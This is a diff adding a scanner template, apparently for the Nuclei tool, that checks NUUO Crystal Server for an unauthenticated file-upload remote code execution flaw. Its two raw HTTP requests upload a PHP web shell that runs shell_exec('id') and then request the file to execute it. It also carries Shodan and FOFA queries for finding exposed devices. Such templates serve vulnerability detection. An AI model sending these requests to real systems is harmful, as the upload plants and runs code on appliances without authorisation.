@@ -1,0 +1,76 @@
+id: nuuo-unauth-rce
+
+info:
+  name: NUUO Crystal Server - Unauthenticated File Upload Remote Code Execution
+  author: Exploit-Garbage
+  severity: critical
+  description: |
+    NUUO Crystal Server 3.19.0.85 exposes an unauthenticated file upload handler at upload.php that echoes the client-supplied multipart filename and passes it directly to copy() as the destination, with no authentication, extension, MIME or path validation. An anonymous POST writes an attacker-named PHP file into the served document root, and a single GET triggers the lighttpd fastcgi mapping to execute it, yielding remote code execution as the product's PHP service account.
+  impact: |
+    An unauthenticated attacker can upload and execute arbitrary PHP, achieving remote code execution as the product's PHP service account and full compromise of the appliance.
+  remediation: |
+    Restrict access to upload.php, require authentication, and enforce extension, MIME and destination-path validation on uploads. Apply vendor updates when available.
+  reference:
+    - https://0day-rubbish.com/blog/nuuo-crystal-server-unauth-upload-php-webroot-write-rce
+    - https://github.com/Exploit-Garbage/0day-Rubbish
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-434
+  metadata:
+    max-request: 2
+    vendor: nuuo
+    product: crystal-server
+    shodan-query: http.html:"NUUO"
+    fofa-query: body="NUUO"
+  tags: nuuo,upload,file-upload,rce,unauth,vrm,cctv,intrusive
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /upload.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----{{randstr_1}}
+
+        ------{{randstr_1}}
+        Content-Disposition: form-data; name="userfile"; filename="{{randstr_2}}.php"
+        Content-Type: application/octet-stream
+
+        <?php echo '{{randstr_3}}'; echo shell_exec('id'); ?>
+        ------{{randstr_1}}--
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+        internal: true
+
+  - raw:
+      - |
+        GET /{{randstr_2}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{randstr_3}}"
+
+      - type: regex
+        part: body
+        regex:
+          - 'uid=[0-9]+\([a-zA-Z0-9_.-]+\)'
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - 'uid=[0-9]+\(.+?\) gid=[0-9]+\(.+?\)[^\r\n<]*'
+# digest: 490a00463044022067ff52bd689c60299ea7c980f11c56335fc5e0f81670cc8c9111d844bcb8f6dd0220672f05abcfafd1205185cf2aaf31c58ba6cb59bdbb825b9e24650c96f86bdc90:922c64590222798bb761d5b6d8e72950
